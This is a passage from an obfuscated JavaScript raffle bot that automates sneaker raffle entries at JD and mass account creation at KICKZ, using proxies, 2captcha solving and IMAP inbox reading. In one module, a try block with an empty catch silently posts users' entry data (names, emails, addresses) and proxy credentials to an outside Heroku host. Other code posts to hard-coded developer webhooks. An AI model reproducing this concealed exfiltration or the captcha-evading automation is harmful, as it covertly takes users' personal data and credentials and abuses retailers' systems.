                                return await _0x9d044a['click'](), await _0x2c02c5['waitForNavigation']({ 'waitUntil': 'networkidle2' }), _0x2734ee('New\x20Section'), _0x1de6d4();
                        }
                        await _0x1de6d4(), await _0x2c02c5['click']('div[jsname=\x22M2UYVd\x22]');
                        try {
                            await _0x2c02c5['waitForSelector']('.vHW8K');
                        } catch {
                            throw new Error('Could\x20not\x20send\x20Form,\x20check\x20all\x20fields!');
                        }
                        _0x53db49(_0x24ebc5[_0x3ea4ee], _0x210c4b), _0x7f6d51 = 'no';
                        var _0x2fd17a = await _0x105954(_0x24ebc5[_0x3ea4ee], _0x210c4b, 'dev', ![]), _0x58a90b = await _0x105954(_0x24ebc5[_0x3ea4ee], _0x210c4b, 'pub', ![]);
                        let _0x4f1208 = _0x24ebc5[_0x3ea4ee];
                        try {
                            prxdata = {
                                'username': _0x5f9620['replace']('#', ''),
                                'module': _0x210c4b['name'],
                                'entrydata': JSON['stringify'](_0x4f1208),
                                'proxy': '' + _0x27a45a[_0x3ea4ee]
                            };
                            var _0x23b160 = JSON['stringify'](prxdata);
                            let _0x3aee40 = { 'headers': { 'content-type': 'application/json' } };
                            await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x23b160, _0x3aee40);
                        } catch (_0x5a88b6) {
                        }
                        const _0x3081dc = {
                            'succesDEVMSG': { 'embeds': [_0x2fd17a] },
                            'succesPUBMSG': { 'embeds': [_0x58a90b] }
                        };
                        try {
                            _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x3081dc['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x3081dc['succesDEVMSG']), await _0x415e3e(0xc8), await _0x4d8e61(_0x3ba9f8, _0x3081dc['succesPUBMSG']);
                        } catch (_0x226a10) {
                            console['log'](_0x5dc29b['yellow'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0x3ea4ee + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x226a10));
                        }
                        console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x210c4b['name'] + ']\x20Task\x20' + (_0x3ea4ee + 0x1) + '\x20:\x20Raffle\x20Entered!')), (_0x43eef6 != 0x0 || _0x10701b != 0x0 && !_0xc8e713) && (_0x22f894['push'](_0x329558), _0xaf9669['writeFileSync']('forms/templates.json', JSON['stringify'](_0x22f894, null, 0x2), 'utf-8'));
                    } catch (_0xa732e9) {
                        console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x210c4b['name'] + ']\x20Task\x20' + (_0x3ea4ee + 0x1) + '\x20:\x20' + _0xa732e9)), _0x22e64a = '' + _0xa732e9;
                        var _0x427580 = await _0x105954(_0x24ebc5[_0x3ea4ee], _0x210c4b, 'dev', !![], _0x22e64a);
                        let _0x3f3162 = {};
                        _0x3f3162['errorDEV'] = { 'embeds': [_0x427580] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x3f3162['errorDEV']), await _0x4d8e61(_0x369064, _0x3f3162['errorDEV']), _0x7f6d51 = 'yes';
                    } finally {
                        _0x27112c && _0x27112c['close']();
                        if (_0x7f6d51 == 'yes' && _0x257f95 != 0x5) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x210c4b['name'] + ']\x20Task\x20' + (_0x3ea4ee + 0x1) + '\x20:\x20Retrying\x20(' + (_0x257f95 + 0x1) + '\x20/\x205)')), _0x3ea4ee--, _0x257f95++;
                            continue;
                        }
                        if (_0x7f6d51 == 'yes' && _0x257f95 == 0x5) {
                            _0x257f95 = 0x0, _0x7f6d51 = 'no';
                            continue;
                        }
                        _0x2734ee('Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'JD',
        'modules': [{
            'name': 'JD\x20Raffle\x20Entries',
            'store': 'JD',
            'logo': 'https://upload.wikimedia.org/wikipedia/en/thumb/d/d8/JD_Sports_logo.svg/2048px-JD_Sports_logo.svg.png',
            'function': async function (_0x14a85d, _0x5ce0cb, _0x1074c2) {
                var _0x15547b = ![], _0x21fda9 = ![];
                if (_0x165c4b['captchaKey'] == '' || _0x165c4b['captchaKey'] == undefined)
                    return console['log'](_0x5dc29b['yellow']('No\x202Captcha\x20key\x20found\x20in\x20settings.json')), console['log']('Returning\x20to\x20Menu'), menu();
                _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x165c4b['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x2018a2 = 0x0; _0x2018a2 < _0x5ce0cb['length']; _0x2018a2++) {
                    if (_0x58764d != 'yes')
                        var _0x58764d = '', _0x4f6a61 = 0x0;
                    var _0x2646a8, _0x2ae64e = [{
                        'type': 'rich',
                        'title': 'Succesful\x20JD\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'Product',
                                'value': '' + _0x5ce0cb[_0x2018a2]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x5ce0cb[_0x2018a2]['Size']
                            },
                            {
                                'name': 'User',
                                'value': '' + _0x5f9620
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x165c4b['delay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x57c4cf
                            }
                        ]
                    }];
                    const _0x10dc43 = { 'embeds': _0x2ae64e };
                    _0x424e52(_0x14a85d['name'] + '\x20Task\x20' + (_0x2018a2 + 0x1) + '\x20/\x20' + _0x5ce0cb['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                    try {
                        await _0x3da21c(_0x5ce0cb, _0x2018a2);
                    } catch {
                        _0x58764d = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    var _0x185080 = await _0x105954(_0x5ce0cb[_0x2018a2], _0x14a85d, 'dev', ![]), _0x271445 = await _0x105954(_0x5ce0cb[_0x2018a2], _0x14a85d, 'pub', ![]);
                    const _0x338d8a = {
                        'succesDEVMSG': { 'embeds': [_0x185080] },
                        'succesPUBMSG': { 'embeds': [_0x271445] }
                    };
                    if (_0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '')
                        try {
                            await _0x4d8e61(_0x165c4b['webhook'], _0x338d8a['succesDEVMSG']);
                        } catch {
                        }
                    await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x338d8a['succesDEVMSG']), await _0x415e3e(0xc8);
                    try {
                        await _0x4d8e61(_0x3ba9f8, _0x338d8a['succesPUBMSG']);
                    } catch {
                    }
                    if (_0x5ce0cb[_0x2018a2]['Email'] == '' || _0x5ce0cb[_0x2018a2]['Url'] == '' || _0x5ce0cb[_0x2018a2]['FirstName'] == '' || _0x5ce0cb[_0x2018a2]['LastName'] == '') {
                        console['log'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0x2018a2 + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x165c4b['useRandomProxy'] = ![])
                        var _0x167b48 = _0x1074c2[_0x2018a2]['split'](':');
                    else
                        var _0x57eba6 = Math['round'](Math['random']() * (_0x1074c2['length'] - 0x1)), _0x167b48 = _0x1074c2[_0x57eba6]['split'](':');
                    var _0x312f77;
                    try {
                        _0x312f77 = await _0x275ae5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x167b48[0x0] + ':' + _0x167b48[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x312f77 = await _0x275ae5['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x167b48[0x0] + ':' + _0x167b48[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x10806b = await _0x312f77['newPage']();
                        await _0x10806b['authenticate']({
                            'username': '' + _0x167b48[0x2],
                            'password': '' + _0x167b48[0x3]
                        }), console['log'](_0x5b438b() + '\x20[' + _0x14a85d['name'] + ']\x20Task\x20' + (_0x2018a2 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x10806b['setRequestInterception'](!![]), _0x10806b['on']('request', _0x589f96 => {
                            _0x589f96['resourceType']() === 'image' || _0x589f96['resourceType']() === 'font' || _0x589f96['resourceType']() === 'media' ? _0x589f96['abort']() : _0x589f96['continue']();
                        });
                        try {
                            await _0x10806b['goto']('' + _0x5ce0cb[_0x2018a2]['Url'], {
                                'waitUntil': 'networkidle2',
                                'timeout': 0xea60
                            });
                        } catch {
                            throw new Error('Connection\x20Error');
                        }
                        try {
                            await _0x10806b['waitForSelector']('#comp_firstname', { 'timeout': 0x7530 });
                        } catch {
                            throw new Error('Not\x20an\x20Active\x20Raffle');
                        }
                        console['log'](_0x5b438b() + '\x20[' + _0x14a85d['name'] + ']\x20Task\x20' + (_0x2018a2 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x10806b['type']('#comp_firstname', '' + _0x5ce0cb[_0x2018a2]['FirstName']), await _0x10806b['waitForSelector']('#comp_lastname'), await _0x10806b['type']('#comp_lastname', '' + _0x5ce0cb[_0x2018a2]['LastName']), await _0x10806b['waitForSelector']('#comp_email'), await _0x10806b['type']('#comp_email', '' + _0x5ce0cb[_0x2018a2]['Email']), await _0x10806b['waitForSelector']('#comp_paypalemail'), await _0x10806b['type']('#comp_paypalemail', '' + _0x5ce0cb[_0x2018a2]['Email']), await _0x10806b['waitForSelector']('#comp_mobile_end'), await _0x10806b['type']('#comp_mobile_end', '' + _0x5ce0cb[_0x2018a2]['Phone']), await _0x10806b['waitForSelector']('#comp_dob'), await _0x10806b['type']('#comp_dob', '08/09/1992'), console['log'](_0x5b438b() + '\x20[' + _0x14a85d['name'] + ']\x20Task\x20' + (_0x2018a2 + 0x1) + '\x20:\x20Choosing\x20Size');
                        if (_0x5ce0cb[_0x2018a2]['Size'] == 'RANDOM') {
                            const _0x526f3e = await _0x10806b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0xf49d08 => {
                                return _0xf49d08['map'](_0x5df2ca => _0x5df2ca['value']);
                            });
                            var _0x56eb80 = Math['round'](Math['random']() * (_0x526f3e['length'] - 0x2));
                            await _0x10806b['select']('#shoesize', _0x526f3e[_0x56eb80 + 0x1]), await _0x415e3e(0x3e8);
                        } else {
                            const _0x4ba9df = await _0x10806b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x453f77 => {
                                return _0x453f77['map'](_0x4741b1 => _0x4741b1['innerText']);
                            }), _0x48910c = await _0x10806b['$$eval']('select[id=\x22shoesize\x22]\x20>\x20option', _0x5edbe1 => {
                                return _0x5edbe1['map'](_0x125f68 => _0x125f68['value']);
                            });
                            var _0x36c2d8 = _0x5ce0cb[_0x2018a2]['Size'];
                            for (var _0x55de2d = 0x1; _0x55de2d < _0x48910c['length']; _0x55de2d++) {
                                var _0xec9fd9 = _0x4ba9df[_0x55de2d]['split']('\x20')[0x0];
                                if (_0xec9fd9 == _0x36c2d8) {
                                    await _0x10806b['select']('#shoesize', _0x48910c[_0x55de2d]);
                                    break;
                                } else {
                                    if (_0x55de2d + 0x1 == _0x48910c['length'])
                                        throw new Error('Size\x20Not\x20Found..');
                                }
                            }
                        }
                        await _0x10806b['waitForSelector']('#comp_address1'), await _0x10806b['type']('#comp_address1', _0x5ce0cb[_0x2018a2]['Address1'] + '\x20' + _0x5ce0cb[_0x2018a2]['HouseNumber']), await _0x10806b['waitForSelector']('#comp_address2'), await _0x10806b['type']('#comp_address2', '' + _0x5ce0cb[_0x2018a2]['Address2']), await _0x10806b['waitForSelector']('#comp_address2'), await _0x10806b['type']('#comp_address3', '' + _0x5ce0cb[_0x2018a2]['City']), await _0x10806b['waitForSelector']('#comp_postcode'), await _0x10806b['type']('#comp_postcode', '' + _0x5ce0cb[_0x2018a2]['Zip']), console['log'](_0x5b438b() + '\x20[' + _0x14a85d['name'] + ']\x20Task\x20' + (_0x2018a2 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x415e3e(0x4b0), await _0x10806b['click']('label#emailhold'), await _0x415e3e(0x5dc), await _0x10806b['click']('#preauth_tandc_email\x20>\x20label'), await _0x415e3e(0x5dc), await _0x10806b['click']('#submit');
                        try {
                            await _0x10806b['waitForSelector']('#paymentWrap');
                        } catch {
                            throw new Error('Could\x20not\x20find\x20Payment');
                        }
                        console['log'](_0x5b438b() + '\x20[' + _0x14a85d['name'] + ']\x20Task\x20' + (_0x2018a2 + 0x1) + '\x20:\x20' + _0x5dc29b['blue']('Awaiting\x20Paypal\x20Payment')), _0x312f77['on']('targetcreated', async _0x2185c6 => {
                            if (_0x2185c6['type']() === 'page') {
                                const _0x29e888 = await _0x2185c6['page']();
                                async function _0x4a732f() {
                                    try {
                                        await _0x10806b['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x21fda9 = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                async function _0x239706() {
                                    try {
                                        await _0x10806b['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x15547b = !![];
                                        return;
                                    } catch {
                                    }
                                }
                                _0x239706(), _0x4a732f(), await _0x415e3e(0x493e0);
                            }
                        });
                        async function _0x5a0ae1() {
                            for (let _0x533973 = 0x0; _0x533973 < 0x12c; _0x533973++) {
                                if (_0x15547b == !![]) {
                                    _0x58764d = 'no', _0x53db49(_0x5ce0cb[_0x2018a2], _0x14a85d), console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x14a85d['name'] + ']\x20Task\x20' + (_0x2018a2 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                    if (_0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '')
                                        try {
                                            await _0x4d8e61(_0x165c4b['webhook'], _0x338d8a['succesDEVMSG']);
                                        } catch {
                                        }
                                    await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0x338d8a['succesDEVMSG']), await _0x415e3e(0xc8);
                                    try {
                                        await _0x4d8e61(_0x3ba9f8, _0x338d8a['succesPUBMSG']);
                                    } catch {
                                    }
                                    return;
                                } else {
                                    if (_0x21fda9)
                                        throw new Error('Paypal\x20Error:\x20Target\x20closed');
                                    else
                                        await _0x415e3e(0x3e8);
                                }
                            }
                            throw new Error('Paypal\x20Error');
                        }
                        await _0x415e3e(0xbb8), await _0x10806b['click']('.zoid-outlet'), await _0x415e3e(0x7d0), await _0x5a0ae1();
                    } catch (_0x587c1b) {
                        console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x14a85d['name'] + ']\x20Task\x20' + (_0x2018a2 + 0x1) + '\x20:\x20' + _0x587c1b)), _0x2646a8 = '' + _0x587c1b;
                        var _0x2973f9 = await _0x105954(_0x5ce0cb[_0x2018a2], _0x14a85d, 'dev', !![], _0x2646a8);
                        _0x338d8a['errorDEV'] = { 'embeds': [_0x2973f9] }, _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x338d8a['errorDEV']), await _0x4d8e61(_0x369064, _0x338d8a['errorDEV']);
                    } finally {
                        _0x312f77 && _0x312f77['close']();
                        if (_0x58764d == 'yes' && _0x4f6a61 != 0x5 && _0x2646a8 != 'Size\x20Not\x20Found') {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x14a85d['name'] + ']\x20Task\x20' + (_0x2018a2 + 0x1) + '\x20:\x20Retrying\x20(' + _0x4f6a61 + '\x20/\x205)')), _0x2018a2 = _0x2018a2 - 0x1, _0x4f6a61 = _0x4f6a61 + 0x1;
                            continue;
                        }
                        _0x58764d == 'yes' && _0x4f6a61 >= 0x5 && (_0x4d12b6(afew[_0x2018a2], _0x14a85d), _0x58764d = 'no', _0x4f6a61 = 0x0), console['log']('Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                    }
                }
            }
        }]
    },
    {
        'name': 'KICKZ',
        'modules': [
            {
                'name': 'KICKZ\x20Account\x20Generator',
                'store': 'KICKZ',
                'logo': 'https://scontent-ams2-1.cdninstagram.com/v/t51.2885-19/240479500_928777121004310_8721482303708952556_n.jpg?stp=dst-jpg_s320x320&_nc_ht=scontent-ams2-1.cdninstagram.com&_nc_cat=1&_nc_ohc=9H1DnW3bwMAAX-W7Mo2&edm=AOQ1c0wBAAAA&ccb=7-5&oh=00_AfDjR8EqgPUyl8iQgx56K_94mx_vSIRsFkQbyEq02-zAUQ&oe=63E0E147&_nc_sid=8fd12b',
                'function': async function (_0xd96b93, _0x3d5b6a, _0x560247) {
                    _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x165c4b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x128b19 = 0x0; _0x128b19 < _0x3d5b6a['length']; _0x128b19++) {
                        const _0x1ca06e = 'https://www.kickz.com/login';
                        if (_0xdb2d8c != 'yes')
                            var _0xdb2d8c = '', _0x41a2c5 = 0x0;
                        _0x424e52(_0xd96b93['name'] + '\x20Task\x20' + (_0x128b19 + 0x1) + '\x20/\x20' + _0x3d5b6a['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                        try {
                            await _0x3da21c(_0x3d5b6a, _0x128b19);
                        } catch {
                            _0xdb2d8c = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x543b78 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Kickz\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5f9620
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x165c4b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x57c4cf
                                }
                            ]
                        }];
                        const _0x38e92e = { 'embeds': _0x543b78 };
                        var _0x557a67 = await _0x105954(_0x3d5b6a[_0x128b19], _0xd96b93, 'acc', ![]);
                        const _0x4f70d9 = { 'succesDEVMSG': { 'embeds': [_0x557a67] } };
                        if (_0x3d5b6a[_0x128b19]['Email'] == '' || _0x3d5b6a[_0x128b19]['FirstName'] == '' || _0x3d5b6a[_0x128b19]['LastName'] == '') {
                            console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x3d5b6a[_0x128b19]['Password'] == '' && (_0x3d5b6a[_0x128b19]['Password'] = 'JRaffles23!');
                        if (_0x165c4b['useRandomProxy'] = ![])
                            var _0x11e257 = _0x560247[_0x128b19]['split'](':');
                        else
                            var _0x587eca = Math['round'](Math['random']() * (_0x560247['length'] - 0x1)), _0x11e257 = _0x560247[_0x587eca]['split'](':');
                        var _0x23bde;
                        try {
                            _0x23bde = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x11e257[0x0] + ':' + _0x11e257[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x23bde = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x11e257[0x0] + ':' + _0x11e257[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x52b0ad = await _0x23bde['newPage']();
                            await _0x52b0ad['authenticate']({
                                'username': '' + _0x11e257[0x2],
                                'password': '' + _0x11e257[0x3]
                            }), console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x52b0ad['setRequestInterception'](!![]), _0x52b0ad['on']('request', _0x33d4fd => {
                                _0x33d4fd['resourceType']() === 'image' || _0x33d4fd['resourceType']() === 'font' || _0x33d4fd['resourceType']() === 'media' ? _0x33d4fd['abort']() : _0x33d4fd['continue']();
                            }), await _0x52b0ad['goto'](_0x1ca06e), await _0x415e3e(0xbb8), console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Starting\x20Registration'), await _0x52b0ad['waitForSelector']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x52b0ad['click']('#consent-dialog\x20>\x20section\x20>\x20button'), await _0x52b0ad['waitForSelector']('#button-register'), await _0x415e3e(0x7d0), await _0x52b0ad['evaluate'](() => {
                                const _0x48d5b8 = document['querySelector']('#button-register');
                                _0x48d5b8['click']();
                            }), console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x415e3e(0x1388), await _0x52b0ad['waitForSelector']('#customer_salutation'), await _0x52b0ad['select']('#customer_salutation', 'mr'), await _0x415e3e(0x7d0), await _0x52b0ad['waitForSelector']('#customer_firstname'), await _0x52b0ad['type']('#customer_firstname', '' + _0x3d5b6a[_0x128b19]['FirstName']), await _0x415e3e(0x352), await _0x52b0ad['waitForSelector']('#customer_lastname'), await _0x52b0ad['type']('#customer_lastname', '' + _0x3d5b6a[_0x128b19]['LastName']), await _0x415e3e(0x352), await _0x52b0ad['type']('#email-input', '' + _0x3d5b6a[_0x128b19]['Email']), await _0x415e3e(0x352), await _0x52b0ad['type']('#email-confirm-input', '' + _0x3d5b6a[_0x128b19]['Email']), await _0x415e3e(0x352), await _0x52b0ad['type']('#register-password', '' + _0x3d5b6a[_0x128b19]['Password']), await _0x415e3e(0x352), await _0x52b0ad['type']('#password-confirm', '' + _0x3d5b6a[_0x128b19]['Password']), await _0x415e3e(0x352), console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Sending\x20Credentials'), await _0x52b0ad['click']('#consent'), await _0x415e3e(0x1f4);
                            const _0x203612 = await _0x52b0ad['$']('div.inputErrorMsg.b-form_section-message');
                            if (_0x203612) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Your\x20password\x20must\x20contain\x20at\x20least\x20one\x20uppercase\x20&\x20one\x20lowercase\x20letter,\x20one\x20number\x20and\x20one\x20special\x20character.'));
                                continue;
                            }
                            await _0x52b0ad['click']('#buttonRegister');
                            try {
                                await _0x52b0ad['waitForSelector']('#verificationCode');
                            } catch {
                                throw new Error('Account\x20already\x20registered');
                            }
                            console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20A\x20verification\x20code\x20has\x20been\x20sent\x20to\x20' + _0x3d5b6a[_0x128b19]['Email']), await _0x415e3e(0x4b0);
                            async function _0xc08f0c() {
                                var _0x525600, _0x1be61d = ![];
                                for (var _0x50dc9f = 0x0; _0x50dc9f < 0x18; _0x50dc9f++) {
                                    async function _0x38227c() {
                                        var _0x25d8b1 = new _0x569e4e({
                                            'user': _0x165c4b['masterMail'],
                                            'password': _0x165c4b['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x2a5d9c(_0x257a9d) {
                                            _0x25d8b1['openBox']('INBOX', ![], _0x257a9d);
                                        }
                                        _0x25d8b1['once']('ready', function () {
                                            console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x2a5d9c(function (_0xa6d7c2, _0x44a7dd) {
                                                console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0xa6d7c2)
                                                    throw _0xa6d7c2;
                                                _0x25d8b1['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'verification@kickz.com'
                                                    ]
                                                ], function (_0x38e788, _0x25e922) {
                                                    if (!_0x25e922 || !_0x25e922['length'])
                                                        console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x25d8b1['end']();
                                                    else {
                                                        var _0x4bc553 = _0x25d8b1['seq']['fetch'](_0x25e922, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x4bc553['on']('message', function (_0x17f21e, _0x57c2c0) {
                                                            var _0x3aaba7 = '(#' + _0x57c2c0 + ')\x20';
                                                            _0x17f21e['on']('body', function (_0x45ad3f, _0x170ab3) {
                                                                _0x2736cb(_0x45ad3f, (_0x275712, _0x751c30) => {
                                                                    if (_0x751c30['subject'] == 'Kickz\x20Account\x20Verification\x20Code') {
                                                                        var _0x20799e = _0x751c30['html']['split']('<div\x20style=\x22display:block;font-family:Arial,sans-serif;font-size:\x2030px;font-weight:\x20600;line-height:24px;color:#333333\x22>'), _0x33713d = _0x20799e[0x1]['split']('<')[0x0];
                                                                        _0x525600 = _0x33713d;
                                                                    }
                                                                });
                                                            }), _0x17f21e['once']('end', function () {
                                                            });
                                                        }), _0x4bc553['once']('error', function (_0x5d9c84) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x4bc553['once']('end', function () {
                                                            _0x25d8b1['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x25d8b1['once']('error', function (_0x226233) {
                                            console['log'](_0x5dc29b['red'](_0x226233['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x1be61d = !![];
                                        }), _0x25d8b1['once']('end', async function () {
                                        }), _0x25d8b1['connect']();
                                    }
                                    _0x38227c(), await _0x415e3e(0x1388);
                                    if (_0x525600)
                                        return _0x525600;
                                    if (_0x1be61d)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x50dc9f == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0xc08f0c(), _0x415e3e(0x320), console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Verifying..'), await _0x52b0ad['type']('#verificationCode', code), await _0x415e3e(0x1f4), await _0x52b0ad['click']('#buttonVerify'), await _0x415e3e(0x190), await _0x52b0ad['click']('#buttonVerify'), await _0x415e3e(0x3e8);
                            try {
                                await _0x52b0ad['waitForSelector']('div.b-user_greeting'), _0xdb2d8c = 'no', console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Account\x20' + _0x3d5b6a[_0x128b19]['Email'] + '\x20Generated\x20&\x20Verified!')), _0xaf9669['appendFileSync']('../accounts/kickz-verified.csv', '\x0a' + _0x3d5b6a[_0x128b19]['Email'] + ',' + _0x3d5b6a[_0x128b19]['Password'] + ','), console['log'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Account\x20' + _0x3d5b6a[_0x128b19]['Email'] + '\x20Saved\x20in\x20\x27accounts/kickz-verified.csv\x27');
                                try {
                                    _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x4f70d9['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4d8e61(_0xd282bc, _0x4f70d9['succesDEVMSG']);
                            } catch {
                                _0xdb2d8c = 'no', console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Verification\x20failed')), console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20Account\x20saved\x20in\x20\x27accounts/kickz-unverified.csv\x27'));
                            }
                        } catch (_0xe0aa27) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0xd96b93['name'] + ']\x20Task\x20' + (_0x128b19 + 0x1) + '\x20:\x20' + _0xe0aa27)), _0x543b78[0x0]['title'] = 'Failed\x20kickz\x20Acc\x20Gen', _0x543b78[0x0]['description'] = '' + _0xe0aa27, await _0x4d8e61(_0x369064, _0x38e92e), _0xdb2d8c = 'yes';
                        } finally {
                            _0x23bde && _0x23bde['close']();
                            if (_0xdb2d8c == 'yes' && _0x41a2c5 != 0x5) {
